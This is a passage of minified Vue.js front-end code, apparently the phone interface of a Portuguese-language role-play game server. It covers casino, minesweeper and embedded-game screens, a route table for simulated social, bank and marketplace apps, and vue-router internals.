        class: "w-full bg-blaze-dark p-6 font-bold rounded-xl text-gray-300 placeholder-current",
        placeholder: "Quantidade",
        type: "text"
    }, null, 512), [
        [ns, l.mines]
    ])])), !l.game.id || l.game.lost ? (wl(), _l("button", {
        key: 3,
        onClick: t[5] || (t[5] = (...e) => l.play && l.play(...e)),
        class: "bg-blaze-red w-full py-4 text-xl text-white rounded-lg"
    }, g(l.game.lost ? "Jogar novamente" : "Jogar"), 1)) : (wl(), _l("button", {
        key: 4,
        onClick: t[6] || (t[6] = (...e) => l.finish && l.finish(...e)),
        class: ["bg-blaze-red w-full py-4 text-xl text-white rounded-lg", {
            "opacity-50": !l.canFinish
        }]
    }, " Finalizar ", 2))])
};
const PI = {
        components: {
            Double: iL,
            Crash: KL,
            Mine: vI
        },
        setup() {
            const e = _o.settings.currency,
                t = rt("double"),
                n = rt(0),
                l = [];

            function a(e) {
                var t;
                t = n, Ck.has(t) && Ck.get(t)(), Ck.delete(t), _k(n, n.value + e)
            }

            function s() {
                for (const {
                        event: e,
                        callback: t
                    }
                    of l) _o.pusher.removeListener(e, t);
                l.length = 0
            }
            return function(e, t) {
                if (!t) return e();
                if (void 0 === aL) {
                    const e = document.createElement("link").relList;
                    aL = e && e.supports && e.supports("modulepreload") ? "modulepreload" : "preload"
                }
                Promise.all(t.map((e => {
                    if (e in sL) return;
                    sL[e] = !0;
                    const t = e.endsWith(".css"),
                        n = t ? '[rel="stylesheet"]' : "";
                    if (document.querySelector(`link[href="${e}"]${n}`)) return;
                    const l = document.createElement("link");
                    return l.rel = t ? "stylesheet" : aL, t || (l.as = "script", l.crossOrigin = ""), l.href = e, document.head.appendChild(l), t ? new Promise(((e, t) => {
                        l.addEventListener("load", e), l.addEventListener("error", t)
                    })) : void 0
                }))).then((() => e()))
            }((() => __import__("https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.8.0/chart.min.js")), void 0), $l("setBalance", (e => _k(n, e))), $l("addBalance", a), $l("onceTab", (function(e, t) {
                l.push({
                    event: e,
                    callback: t
                }), _o.pusher.on(e, t)
            })), _o.pusher.on("CASINO_INCREMENT", a), Rn(t, s), wn(s), _o.backend.casino_balance().then((e => n.value = Number(e))), {
                currency: e,
                tab: t,
                balance: n,
                deposit: function() {
                    _o.prompt("Digite o valor do depósito").then((e => {
                        const t = parseInt(e);
                        t && t > 0 && _o.backend.casino_deposit(t).then((e => {
                            e && (n.value += t)
                        }))
                    }), (() => {}))
                },
                withdraw: function() {
                    _o.prompt("Digite o valor do saque").then((e => {
                        const t = parseInt(e);
                        t && t > 0 && _o.backend.casino_withdraw(t).then((e => {
                            e && (n.value -= t)
                        }))
                    }), (() => {}))
                }
            }
        },
        mounted() {
            _o.backend.casino_subscribe()
        },
        unmounted() {
            _o.backend.casino_unsubscribe()
        }
    },
    LI = {
        class: "h-full flex flex-col bg-blaze-dark sofia-pro"
    },
    II = {
        class: "h-36 pt-12 px-10 flex justify-start items-center flex-shrink-0"
    },
    OI = Pl("img", {
        class: "w-12 h-12",
        src: "https://blaze.com/static/media/logo-icon.75d9365f.svg",
        alt: ""
    }, null, -1),
    MI = {
        class: "border rounded-xl border-gray-700 ml-auto font-bold p-3 flex space-x-5 text-2xl"
    },
    VI = {
        class: "text-coolGray-400"
    },
    DI = {
        class: "text-white"
    },
    UI = Pl("i", {
        class: "fas fa-exchange"
    }, null, -1),
    NI = {
        class: "mt-auto flex-shrink-0 h-32 grid grid-cols-3 bg-coolGray-800 text-white text-xl border-t border-coolGray-700"
    },
    $I = Pl("svg", {
        width: "3rem",
        height: "3rem",
        viewBox: "0 0 20 20",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
    }, [Pl("path", {
        d: "M1 6H0V14H1C1.26522 14 1.51957 13.8946 1.70711 13.7071C1.89464 13.5196 2 13.2652 2 13V7C2 6.73478 1.89464 6.48043 1.70711 6.29289C1.51957 6.10536 1.26522 6 1 6Z",
        fill: "#8C9099"
    }), Pl("path", {
        d: "M19 6C18.7348 6 18.4804 6.10536 18.2929 6.29289C18.1054 6.48043 18 6.73478 18 7V13C18 13.2652 18.1054 13.5196 18.2929 13.7071C18.4804 13.8946 18.7348 14 19 14H20V6H19Z",
        fill: "#8C9099"
    }), Pl("path", {
        d: "M9 14V4H6C5.46957 4 4.96086 4.21071 4.58579 4.58579C4.21071 4.96086 4 5.46957 4 6V14C4 14.5304 4.21071 15.0391 4.58579 15.4142C4.96086 15.7893 5.46957 16 6 16H9V14Z",
        fill: "#414952"
    }), Pl("path", {
        d: "M14 4H11V16H14C14.5304 16 15.0391 15.7893 15.4142 15.4142C15.7893 15.0391 16 14.5304 16 14V6C16 5.46957 15.7893 4.96086 15.4142 4.58579C15.0391 4.21071 14.5304 4 14 4Z",
        fill: "#414952"
    }), Pl("path", {
        d: "M9 19C9 19.2652 9.10536 19.5196 9.29289 19.7071C9.48043 19.8946 9.73478 20 10 20C10.2652 20 10.5196 19.8946 10.7071 19.7071C10.8946 19.5196 11 19.2652 11 19V16H9V19Z",
        fill: "#8C9099"
    }), Pl("path", {
        d: "M11 1C11 0.734784 10.8946 0.48043 10.7071 0.292893C10.5196 0.105357 10.2652 0 10 0C9.73478 0 9.48043 0.105357 9.29289 0.292893C9.10536 0.48043 9 0.734784 9 1V4H11V1Z",
        fill: "#8C9099"
    })], -1),
    jI = Pl("h1", {
        class: "mt-2"
    }, "Double", -1),
    FI = Pl("svg", {
        width: "3rem",
        height: "3rem",
        viewBox: "0 0 21 20",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
    }, [Pl("path", {
        d: "M13.14 5C12.69 5.45 12.14 5.64 11.9 5.41C11.66 5.18 11.9 4.63 12.32 4.17C12.74 3.71 13.32 3.53 13.56 3.76C13.8 3.99 13.6 4.53 13.14 5Z",
        fill: "#414952"
    }), Pl("path", {
        d: "M18 0H2C1.46957 0 0.96086 0.210714 0.585787 0.585786C0.210714 0.960859 0 1.46957 0 2V20C6.28 20 10.6 15.76 12.25 10.67C12.8089 10.8838 13.4016 10.9956 14 11C14.11 11 14.2 11 14.31 11C13.2234 14.7898 10.7158 18.0139 7.31 20H18C18.5304 20 19.0391 19.7893 19.4142 19.4142C19.7893 19.0391 20 18.5304 20 18V2C20 1.46957 19.7893 0.960859 19.4142 0.585786C19.0391 0.210714 18.5304 0 18 0V0ZM14 9C13.4067 9 12.8266 8.82405 12.3333 8.49441C11.8399 8.16476 11.4554 7.69623 11.2284 7.14805C11.0013 6.59987 10.9419 5.99667 11.0576 5.41473C11.1734 4.83279 11.4591 4.29824 11.8787 3.87868C12.2982 3.45912 12.8328 3.1734 13.4147 3.05764C13.9967 2.94189 14.5999 3.0013 15.1481 3.22836C15.6962 3.45542 16.1648 3.83994 16.4944 4.33329C16.8241 4.82664 17 5.40666 17 6C17 6.79565 16.6839 7.55871 16.1213 8.12132C15.5587 8.68393 14.7957 9 14 9Z",
        fill: "#8C9099"
    }), Pl("path", {
        d: "M19.94 1.54006C19.94 1.45006 19.94 1.35006 19.86 1.26006C19.8414 1.22776 19.8247 1.19436 19.81 1.16006L19.69 0.940059L19.62 0.830059L19.51 0.660059C19.4821 0.618792 19.4485 0.581747 19.41 0.550059L19.22 0.420059L19.08 0.320059C19.0366 0.29081 18.9895 0.267283 18.94 0.250059C18.8034 0.172451 18.6594 0.108797 18.51 0.0600586C18.5241 0.206388 18.5241 0.353729 18.51 0.500059V16.7501C18.51 17.2142 18.3256 17.6593 17.9975 17.9875C17.6693 18.3157 17.2241 18.5001 16.76 18.5001H9.41002C8.74004 19.0592 8.02418 19.561 7.27002 20.0001H18C18.5305 20.0001 19.0392 19.7893 19.4142 19.4143C19.7893 19.0392 20 18.5305 20 18.0001V2.00006C20.0158 1.87054 20.0158 1.73958 20 1.61006C19.9847 1.58307 19.9644 1.5593 19.94 1.54006Z",
        fill: "#414952"
    })], -1),
    zI = Pl("h1", {
        class: "mt-2"
    }, "Crash", -1),
    BI = Pl("svg", {
        width: "3rem",
        height: "3rem",
        viewBox: "0 0 20 20",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
    }, [Pl("path", {
        "fill-rule": "evenodd",
        "clip-rule": "evenodd",
        d: "M16.0889 6.31927L15.2989 7.09927C14.9289 7.46927 13.5889 6.72927 12.2989 5.43927C11.8226 4.96474 11.3969 4.44192 11.0289 3.87927C10.6689 3.30927 10.4989 2.87927 10.5889 2.57927C9.99471 2.44642 9.38773 2.37935 8.77888 2.37927C6.83085 2.37942 4.93857 3.02963 3.40187 4.22687C1.86517 5.42412 0.771943 7.09993 0.295399 8.98877C-0.181146 10.8776 -0.0137504 12.8715 0.771062 14.6544C1.55588 16.4374 2.91322 17.9074 4.62803 18.8317C6.34284 19.756 8.31705 20.0816 10.2378 19.7569C12.1586 19.4322 13.9161 18.4759 15.2319 17.0394C16.5477 15.6029 17.3465 13.7684 17.5017 11.8265C17.657 9.88468 17.1597 7.94657 16.0889 6.31927ZM5.33888 7.05927C4.33888 8.11927 3.09888 8.62927 2.68888 8.21927C2.27888 7.80927 2.79888 6.61927 3.84888 5.56927C4.89888 4.51927 6.08888 3.99927 6.49888 4.40927C6.90888 4.81927 6.38888 5.99927 5.33888 7.05927Z",
        fill: "#414952"
    }), Pl("path", {
        "fill-rule": "evenodd",
        "clip-rule": "evenodd",
        d: "M10.0289 18.6294C8.37383 18.6292 6.75272 18.1596 5.35379 17.2751C3.95485 16.3905 2.83547 15.1274 2.12559 13.6323C1.41571 12.1371 1.14445 10.4713 1.34329 8.82817C1.54213 7.18505 2.20291 5.63202 3.24894 4.34937C2.29467 5.12084 1.51335 6.08441 0.955698 7.17749C0.39805 8.27057 0.0765523 9.46873 0.0120843 10.6941C-0.0523837 11.9196 0.141619 13.1448 0.581494 14.2904C1.02137 15.436 1.69728 16.4762 2.56533 17.3435C3.43338 18.2109 4.47416 18.8859 5.62008 19.3249C6.766 19.7638 7.99143 19.9568 9.21679 19.8914C10.4422 19.8259 11.6401 19.5034 12.7327 18.9449C13.8253 18.3864 14.7882 17.6043 15.5589 16.6494C14.0021 17.9327 12.0465 18.6329 10.0289 18.6294Z",
        fill: "#414952"
    }), Pl("path", {
        d: "M14.529 3.87937C14.4516 3.87953 14.3756 3.8588 14.309 3.81937C14.2498 3.79057 14.1969 3.75037 14.1533 3.70108C14.1097 3.65179 14.0762 3.59437 14.0549 3.53212C14.0335 3.46988 14.0246 3.40402 14.0288 3.33834C14.0329 3.27266 14.05 3.20844 14.079 3.14937C14.2144 2.88712 14.3898 2.64758 14.599 2.43937C13.439 1.36937 12.309 0.779368 12.029 1.11937C11.749 1.45937 12.399 2.81937 13.689 4.11937C14.979 5.41937 16.319 6.11937 16.689 5.77937C17.059 5.43937 16.439 4.31937 15.369 3.14937C15.2319 3.27988 15.1171 3.43188 15.029 3.59937C14.9822 3.68989 14.9099 3.76468 14.821 3.81446C14.7321 3.86424 14.6306 3.88681 14.529 3.87937Z",
        fill: "#414952"
    }), Pl("path", {
        d: "M19.6189 0.0493271C19.5592 0.0206524 19.4944 0.0041153 19.4283 0.000675356C19.3622 -0.00276459 19.2961 0.00696118 19.2337 0.0292882C19.1714 0.0516153 19.1141 0.086099 19.0652 0.130738C19.0163 0.175377 18.9768 0.229283 18.9489 0.289327C18.6189 0.989327 17.8389 1.17933 16.9489 1.39933C16.092 1.51215 15.2826 1.85805 14.6089 2.39933L14.9789 2.73933L15.3189 3.09933C15.8608 2.68431 16.5022 2.4188 17.1789 2.32933C17.7217 2.28984 18.2475 2.12248 18.7133 1.84092C19.1791 1.55937 19.5716 1.17161 19.8589 0.709327C19.8874 0.650385 19.9038 0.586332 19.9071 0.520952C19.9104 0.455572 19.9006 0.39019 19.8782 0.328667C19.8558 0.267144 19.8214 0.210728 19.7768 0.16275C19.7323 0.114772 19.6786 0.0762053 19.6189 0.0493271Z",
        fill: "#414952"
    })], -1),
    HI = Pl("h1", {
        class: "mt-2"
    }, "Mine", -1);
PI.render = function(e, t, n, l, a, s) {
    const o = dl("Double"),
        r = dl("Crash"),
        i = dl("Mine");
    return wl(), _l("div", LI, [Pl("div", II, [OI, Pl("div", MI, [Pl("h1", VI, g(l.currency), 1), Pl("h3", DI, g(l.balance.toLocaleString()), 1)]), Pl("button", {
        onClick: t[1] || (t[1] = (...e) => l.deposit && l.deposit(...e)),
        class: "bg-blaze-red text-white text-xl font-bold h-14 px-4 ml-5 rounded-lg"
    }, " Depositar "), Pl("button", {
        onClick: t[2] || (t[2] = (...e) => l.withdraw && l.withdraw(...e)),
        class: "bg-blaze-red text-white text-xl font-bold h-14 px-4 ml-5 rounded-lg"
    }, [UI])]), "double" == l.tab ? (wl(), _l(o, {
        key: 0
    })) : Ml("", !0), "crash" == l.tab ? (wl(), _l(r, {
        key: 1
    })) : "mine" == l.tab ? (wl(), _l(i, {
        key: 2
    })) : Ml("", !0), Pl("div", NI, [Pl("button", {
        onClick: t[3] || (t[3] = e => l.tab = "double"),
        class: "mx-auto flex flex-col flex-center"
    }, [$I, jI]), Pl("button", {
        onClick: t[4] || (t[4] = e => l.tab = "crash"),
        class: "mx-auto flex flex-col flex-center"
    }, [FI, zI]), Pl("button", {
        onClick: t[5] || (t[5] = e => l.tab = "mine"),
        class: "mx-auto flex flex-col flex-center"
    }, [BI, HI])])])
};
const qI = {
        setup() {
            jl("setDark")(!0);
            const e = Ze([]),
                t = Ze({
                    state: "",
                    time: 0,
                    bombs: 0,
                    marked: 0
                });

            function n(e) {
                return e[Math.floor(e.length * Math.random())]
            }
            return setInterval((() => {
                "playing" == t.state && (t.time += 1)
            }), 1e3), {
                game: t,
                columns: e,
                newGame: function(l, a) {
                    e.length = 0, t.state = "playing", t.bombs = a, t.marked = 0, t.time = 0;
                    for (let t = 0; t < l; t++) {
                        const n = [];
                        for (let e = 0; e < l; e++) n.push({
                            x: t,
                            y: e,
                            nearby: 0,
                            revealed: !1,
                            marked: !1,
                            mine: !1
                        });
                        e.push(n)
                    }
                    for (; a;) {
                        const t = n(n(e));
                        t.mine || (t.mine = !0, a -= 1)
                    }
                },
                reveal: function n(l) {
                    if (!l.marked && "defeat" != t.state && !l.revealed)
                        if (l.revealed = !0, l.mine) t.state = "defeat";
                        else {
                            const a = e.flat(),
                                s = a.filter((e => e != l && Math.sqrt((e.x - l.x) ** 2 + (e.y - l.y) ** 2) < 1.9)),
                                o = s.reduce(((e, t) => e + t.mine), 0);
                            0 == o ? s.forEach((e => n(e))) : l.nearby = o;
                            a.reduce(((e, t) => e + t.revealed), 0) == a.length - t.bombs && (t.state = "win")
                        }
                },
                mark: function(e) {
                    e.revealed || "playing" != t.state || t.marked >= t.bombs && !e.marked || (e.marked = !e.marked, t.marked += e.marked ? 1 : -1)
                }
            }
        }
    },
    GI = {
        class: "flex flex-col h-full bg-gray-800"
    },
    WI = {
        class: "flex justify-between p-8 pt-48"
    },
    KI = {
        class: "flex"
    },
    JI = {
        class: "flex flex-center"
    },
    XI = {
        key: 0,
        class: "fas fa-flag-alt text-lg text-red-600"
    },
    YI = {
        key: 1,
        class: "fas fa-bomb"
    },
    ZI = {
        key: 0,
        class: "flex-1 bg-gray-800"
    },
    QI = {
        class: "flex justify-between p-8"
    },
    eO = {
        class: "bg-gray-600 ring ring-gray-500 text-white text-center p-5 rounded-xl w-32"
    },
    tO = {
        class: "bg-gray-600 ring ring-gray-500 text-white text-center p-5 rounded-xl w-32"
    },
    nO = {
        key: 1,
        class: "text-white text-center text-4xl pt-8"
    },
    lO = {
        key: 0
    },
    aO = {
        key: 1
    },
    sO = {
        key: 2
    };
qI.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", GI, [Pl("div", WI, [(wl(), _l(bl, null, fa([
        [5, 5],
        [9, 10],
        [12, 20]
    ], (([e, t]) => Pl("div", {
        key: e,
        class: "bg-gray-600 ring ring-gray-500 text-white p-5 rounded-xl",
        onClick: n => l.newGame(e, t)
    }, [Pl("h3", null, g(e) + "x" + g(e), 1)], 8, ["onClick"]))), 64))]), Pl("div", KI, [(wl(!0), _l(bl, null, fa(l.columns, ((e, t) => (wl(), _l("div", {
        class: "flex flex-col flex-1",
        key: t
    }, [(wl(!0), _l(bl, null, fa(e, ((e, t) => (wl(), _l("div", {
        key: t,
        class: ["w-full square border border-gray-600 flex flex-center", [e.revealed ? "bg-gray-400" : "bg-gray-500"]],
        onClick: t => l.reveal(e),
        onContextmenu: is((t => l.mark(e)), ["prevent", "stop"])
    }, [Pl("div", JI, [e.marked ? (wl(), _l("i", XI)) : e.revealed && e.mine ? (wl(), _l("i", YI)) : (wl(), _l("p", {
        key: 2,
        nearby: e.nearby,
        class: "font-bold"
    }, g(e.nearby || ""), 9, ["nearby"]))])], 42, ["onClick", "onContextmenu"])))), 128))])))), 128))]), "playing" == l.game.state ? (wl(), _l("div", ZI, [Pl("div", QI, [Pl("div", eO, g(e.$filters.duration(l.game.time)), 1), Pl("div", tO, [Pl("h3", null, "💣 " + g(l.game.bombs - l.game.marked), 1)])])])) : (wl(), _l("div", nO, ["win" == l.game.state ? (wl(), _l("h1", lO, "Você venceu em " + g(e.$filters.duration(l.game.time)), 1)) : "defeat" == l.game.state ? (wl(), _l("h1", aO, "Você perdeu")) : (wl(), _l("h1", sO, "Escolha um modo de jogo"))]))])
};
const oO = {
        setup: () => (jl("setDark")(_o.darkTheme.value), {
            isAndroid: _o.settings.isAndroid
        })
    },
    rO = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    iO = {
        class: "h-32 pt-16"
    },
    cO = {
        key: 0,
        class: "far fa-arrow-left"
    },
    uO = {
        key: 1,
        class: "fas fa-chevron-left text-blue-500"
    },
    dO = Pl("iframe", {
        class: "flex-1 w-full",
        src: "https://trucoon.com.br/jogo/",
        frameborder: "0"
    }, "\r\n    ", -1);
oO.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", rO, [Pl("div", iO, [Pl("button", {
        class: "absolute top-16 left-0 px-4",
        onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
    }, [l.isAndroid ? (wl(), _l("i", cO)) : (wl(), _l("i", uO))]), Pl("h1", {
        class: ["font-bold", {
            "ml-16": l.isAndroid,
            "text-center": !l.isAndroid
        }]
    }, "Truco", 2)]), dO])
};
const pO = {
        setup: () => (jl("setDark")(_o.darkTheme.value), {
            isAndroid: _o.settings.isAndroid
        })
    },
    fO = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    mO = {
        class: "h-32 pt-16"
    },
    hO = {
        key: 0,
        class: "far fa-arrow-left"
    },
    bO = {
        key: 1,
        class: "fas fa-chevron-left text-blue-500"
    },
    gO = Pl("iframe", {
        class: "flex-1 w-full",
        src: "https://slither.io/",
        frameborder: "0"
    }, "\r\n    ", -1);
pO.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", fO, [Pl("div", mO, [Pl("button", {
        class: "absolute top-16 left-0 px-4",
        onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
    }, [l.isAndroid ? (wl(), _l("i", hO)) : (wl(), _l("i", bO))]), Pl("h1", {
        class: ["font-bold", {
            "ml-16": l.isAndroid,
            "text-center": !l.isAndroid
        }]
    }, "Gulper", 2)]), gO])
};
const vO = [{
        path: "/",
        component: lc
    }, {
        path: "/home",
        component: cc
    }, {
        path: "/video",
        component: fr
    }, {
        path: "/settings",
        component: vc
    }, {
        path: "/contacts",
        component: lu
    }, {
        path: "/contacts/services",
        component: Iu
    }, {
        path: "/contacts/dial",
        component: qu
    }, {
        path: "/contacts/history",
        component: id
    }, {
        path: "/contacts/blocks",
        component: kd
    }, {
        path: "/contacts/create",
        component: vu
    }, {
        path: "/contacts/:id",
        component: Au
    }, {
        path: "/call",
        component: Cp
    }, {
        path: "/sms",
        component: Ed
    }, {
        path: "/sms/:id",
        component: Hd
    }, {
        path: "/gallery",
        component: ap
    }, {
        path: "/gallery/:folder",
        component: ap
    }, {
        path: "/gallery/carousel/:file",
        component: hp
    }, {
        path: "/whatsapp",
        component: xf,
        meta: {
            keepAlive: !0
        }
    }, {
        path: "/whatsapp/create",
        component: Hm
    }, {
        path: "/whatsapp/edit/:group",
        component: ch
    }, {
        path: "/whatsapp/:contact",
        component: om
    }, {
        path: "/tor",
        component: Bh
    }, {
        path: "/tor/groups",
        component: tb
    }, {
        path: "/tor/store",
        component: Lb
    }, {
        path: "/tor/store/create",
        component: Hb
    }, {
        path: "/tor/payments",
        component: Qb
    }, {
        path: "/tor/:id",
        component: mb
    }, {
        path: "/instagram",
        component: ov
    }, {
        path: "/instagram/login",
        component: bv
    }, {
        path: "/instagram/register",
        component: _v
    }, {
        path: "/instagram/search",
        component: Uv
    }, {
        path: "/instagram/create",
        component: yg
    }, {
        path: "/instagram/notifications",
        component: qv
    }, {
        path: "/instagram/edit",
        component: Zv
    }, {
        path: "/instagram/profiles/:id",
        component: cx
    }, {
        path: "/instagram/posts/:id",
        component: Tx
    }, {
        path: "/instagram/stories/:id",
        component: Jg
    }, {
        path: "/twitter",
        component: Jx
    }, {
        path: "/twitter/register",
        component: Zx
    }, {
        path: "/twitter/create",
        component: oy
    }, {
        path: "/twitter/posts/:id",
        component: py
    }, {
        path: "/twitter/profiles/:id",
        component: jy
    }, {
        path: "/twitter/settings",
        component: ak
    }, {
        path: "/bank",
        component: Jk
    }, {
        path: "/bank/pix",
        component: hw
    }, {
        path: "/bank/transfer",
        component: Fw
    }, {
        path: "/bank/receipt",
        component: sC
    }, {
        path: "/bank/statements",
        component: gC
    }, {
        path: "/bank/invoices",
        component: PC
    }, {
        path: "/bank/invoices/create",
        component: qC
    }, {
        path: "/bank/fines",
        component: d_
    }, {
        path: "/paypal",
        component: S_
    }, {
        path: "/olx",
        component: dS
    }, {
        path: "/olx/create",
        component: yS
    }, {
        path: "/olx/search",
        component: MS
    }, {
        path: "/olx/dashboard",
        component: fR
    }, {
        path: "/olx/:id",
        component: $S
    }, {
        path: "/tinder",
        component: AR
    }, {
        path: "/tinder/register",
        component: FR
    }, {
        path: "/tinder/likes",
        component: mT
    }, {
        path: "/tinder/chats",
        component: wT
    }, {
        path: "/tinder/chats/:id",
        component: VT
    }, {
        path: "/tinder/profile",
        component: XT
    }, {
        path: "/yellowpages",
        component: gE
    }, {
        path: "/yellowpages/create",
        component: SE
    }, {
        path: "/weazel",
        component: dP
    }, {
        path: "/weazel/create",
        component: VP
    }, {
        path: "/weazel/:id/edit",
        component: VP
    }, {
        path: "/weazel/:id",
        component: KP
    }, {
        path: "/casino",
        component: PI
    }, {
        path: "/custom/:id",
        component: pE
    }, {
        path: "/calculator",
        component: PE
    }, {
        path: "/notes",
        component: WE
    }, {
        path: "/notes/create",
        component: aP
    }, {
        path: "/notes/:id",
        component: rP
    }, {
        path: "/minesweeper",
        component: qI
    }, {
        path: "/truco",
        component: oO
    }, {
        path: "/gulper",
        component: pO
    }],
    xO = function(e) {
        const t = gi(e.routes, e);
        let n = e.parseQuery || ji,
            l = e.stringifyQuery || Fi,
            a = e.history;
        const s = Bi(),
            o = Bi(),
            r = Bi(),
            i = ct(ai, !0);
        let c = ai;
        Lr && e.scrollBehavior && "scrollRestoration" in history && (history.scrollRestoration = "manual");
        const u = Or.bind(null, (e => "" + e)),
            d = Or.bind(null, Ni),
            p = Or.bind(null, $i);

        function f(e, s) {
            if (s = Ir({}, s || i.value), "string" == typeof e) {
                let l = Dr(n, e, s.path),
                    o = t.resolve({
                        path: l.path
                    }, s),
                    r = a.createHref(l.fullPath);
                return Ir(l, o, {
                    params: p(o.params),
                    hash: $i(l.hash),
                    redirectedFrom: void 0,
                    href: r
                })
            }
            let o;
            "path" in e ? o = Ir({}, e, {
                path: Dr(n, e.path, s.path).path
            }) : (o = Ir({}, e, {
                params: d(e.params)
            }), s.params = d(s.params));
            let r = t.resolve(o, s);
            const c = e.hash || "";
            r.params = u(p(r.params));
            const f = function(e, t) {
                let n = t.query ? e(t.query) : "";
                return t.path + (n && "?") + n + (t.hash || "")
            }(l, Ir({}, e, {
                hash: (m = c, Di(m).replace(Ii, "{").replace(Mi, "}").replace(Pi, "^")),
                path: r.path
            }));
            var m;
            let h = a.createHref(f);
            return Ir({
                fullPath: f,
                hash: c,
                query: l === Fi ? zi(e.query) : e.query
            }, r, {
                redirectedFrom: void 0,
                href: h
            })
        }

        function m(e) {
            return "string" == typeof e ? Dr(n, e, i.value.path) : Ir({}, e)
        }

        function h(e, t) {
            if (c !== e) return ii(8, {
                from: t,
                to: e
            })
        }

        function b(e) {
            return v(e)
        }

        function g(e) {
            const t = e.matched[e.matched.length - 1];
            if (t && t.redirect) {
                const {
                    redirect: n
                } = t;
                let l = "function" == typeof n ? n(e) : n;
                return "string" == typeof l && (l = l.indexOf("?") > -1 || l.indexOf("#") > -1 ? l = m(l) : {
                    path: l
                }), Ir({
                    query: e.query,
                    hash: e.hash,
                    params: e.params
                }, l)
            }
        }

        function v(e, t) {
            const n = c = f(e),
                a = i.value,
                s = e.state,
                o = e.force,
                r = !0 === e.replace,
                u = g(n);
            if (u) return v(Ir(m(u), {
                state: s,
                force: o,
                replace: r
            }), t || n);
            const d = n;
            let p;
            return d.redirectedFrom = t, !o && function(e, t, n) {
                let l = t.matched.length - 1,
                    a = n.matched.length - 1;
                return l > -1 && l === a && Nr(t.matched[l], n.matched[a]) && $r(t.params, n.params) && e(t.query) === e(n.query) && t.hash === n.hash
            }(l, a, n) && (p = ii(16, {
                to: d,
                from: a
            }), P(a, a, !0, !1)), (p ? Promise.resolve(p) : y(d, a)).catch((e => ci(e) ? e : T(e))).then((e => {
                if (e) {
                    if (ci(e, 2)) return v(Ir(m(e.to), {
                        state: s,
                        force: o,
                        replace: r
                    }), t || d)
                } else e = w(d, a, !0, r, s);
                return k(d, a, e), e
            }))
        }

        function x(e, t) {
            const n = h(e, t);
            return n ? Promise.reject(n) : Promise.resolve()
        }

        function y(e, t) {
            let n;
            const [l, a, r] = function(e, t) {
                const n = [],
                    l = [],
                    a = [],
                    s = Math.max(t.matched.length, e.matched.length);
                for (let o = 0; o < s; o++) {
                    const s = t.matched[o];
                    s && (e.matched.find((e => Nr(e, s))) ? l.push(s) : n.push(s));
                    const r = e.matched[o];
                    r && (t.matched.find((e => Nr(e, r))) || a.push(r))
                }
                return [n, l, a]
            }(e, t);
            n = qi(l.reverse(), "beforeRouteLeave", e, t);
            for (const s of l) s.leaveGuards.forEach((l => {
                n.push(Hi(l, e, t))
            }));
            const i = x.bind(null, e, t);
            return n.push(i), Zi(n).then((() => {
                n = [];
                for (const l of s.list()) n.push(Hi(l, e, t));
                return n.push(i), Zi(n)
            })).then((() => {
                n = qi(a, "beforeRouteUpdate", e, t);
                for (const l of a) l.updateGuards.forEach((l => {
                    n.push(Hi(l, e, t))
                }));
                return n.push(i), Zi(n)
            })).then((() => {
                n = [];
                for (const l of e.matched)
                    if (l.beforeEnter && t.matched.indexOf(l) < 0)
                        if (Array.isArray(l.beforeEnter))
                            for (const a of l.beforeEnter) n.push(Hi(a, e, t));
                        else n.push(Hi(l.beforeEnter, e, t));
                return n.push(i), Zi(n)
            })).then((() => (e.matched.forEach((e => e.enterCallbacks = {})), n = qi(r, "beforeRouteEnter", e, t), n.push(i), Zi(n)))).then((() => {
                n = [];
                for (const l of o.list()) n.push(Hi(l, e, t));
                return n.push(i), Zi(n)
            })).catch((e => ci(e, 8) ? e : Promise.reject(e)))
        }

        function k(e, t, n) {
            for (const l of r.list()) l(e, t, n)
        }

        function w(e, t, n, l, s) {
            const o = h(e, t);
            if (o) return o;
            const r = t === ai,
                c = Lr ? history.state : {};
            n && (l || r ? a.replace(e.fullPath, Ir({
                scroll: r && c && c.scroll
            }, s)) : a.push(e.fullPath, s)), i.value = e, P(e, t, n, r), E()
        }
        let C;

        function _() {
            C = a.listen(((e, t, n) => {
                let l = f(e);
                const s = g(l);
                if (s) return void v(Ir(s, {
                    replace: !0
                }), l).catch(Mr);
                c = l;
                const o = i.value;
                var r, u;
                Lr && (r = Yr(o.fullPath, n.delta), u = Jr(), Zr.set(r, u)), y(l, o).catch((e => ci(e, 12) ? e : ci(e, 2) ? (v(e.to, l).catch(Mr), Promise.reject()) : (n.delta && a.go(-n.delta, !1), T(e)))).then((e => {
                    (e = e || w(l, o, !1)) && n.delta && a.go(-n.delta, !1), k(l, o, e)
                })).catch(Mr)
            }))
        }
        let A, S = Bi(),
            R = Bi();

        function T(e) {
            return E(e), R.list().forEach((t => t(e))), Promise.reject(e)
        }

        function E(e) {
            A || (A = !0, _(), S.list().forEach((([t, n]) => e ? n(e) : t())), S.reset())
        }

        function P(t, n, l, a) {
            const {
                scrollBehavior: s
            } = e;
            if (!Lr || !s) return Promise.resolve();
            let o = !l && function(e) {
                const t = Zr.get(e);
                return Zr.delete(e), t
            }(Yr(t.fullPath, 0)) || (a || !l) && history.state && history.state.scroll || null;
            return Lt().then((() => s(t, n, o))).then((e => e && Xr(e))).catch(T)
        }
        const L = e => a.go(e);
        let I;
        const O = new Set;
        return {
            currentRoute: i,
            addRoute: function(e, n) {
                let l, a;
                return li(e) ? (l = t.getRecordMatcher(e), a = n) : a = e, t.addRoute(a, l)
            },
            removeRoute: function(e) {
                let n = t.getRecordMatcher(e);
                n && t.removeRoute(n)
            },
            hasRoute: function(e) {
                return !!t.getRecordMatcher(e)
            },
            getRoutes: function() {
                return t.getRoutes().map((e => e.record))
            },
            resolve: f,
            options: e,
            push: b,
            replace: function(e) {
                return b(Ir(m(e), {
                    replace: !0
                }))
            },
            go: L,
            back: () => L(-1),
            forward: () => L(1),
            beforeEach: s.add,
            beforeResolve: o.add,
            afterEach: r.add,
            onError: R.add,
            isReady: function() {
                return A && i.value !== ai ? Promise.resolve() : new Promise(((e, t) => {
                    S.add([e, t])
                }))
            },
